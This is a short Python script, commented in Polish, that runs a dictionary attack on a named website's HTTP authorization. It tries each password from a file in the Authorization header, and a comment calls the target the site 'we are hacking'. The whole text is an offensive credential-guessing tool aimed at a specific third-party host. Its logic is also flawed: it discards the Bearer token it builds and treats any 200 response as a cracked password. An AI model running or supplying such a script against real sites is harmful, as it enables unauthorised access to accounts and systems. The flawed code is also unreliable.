import requests

def crack_password(authorization_header, dictionary_file):
    url = "http://technischools.com" # Adres strony, którą hackujemy
    headers = {"Authorization": authorization_header.strip()}

    with open(dictionary_file, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        headers["Authorization"] = password

        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            print("Password found: ", password)
            return

    print("Nie udało się złamać hasła.")

authorization_header = "Bearer <token>"  # Token do autoryzacji
dictionary_file = "dictionary.txt" # Ścieżka do pliku z hasłami
crack_password(authorization_header, dictionary_file)
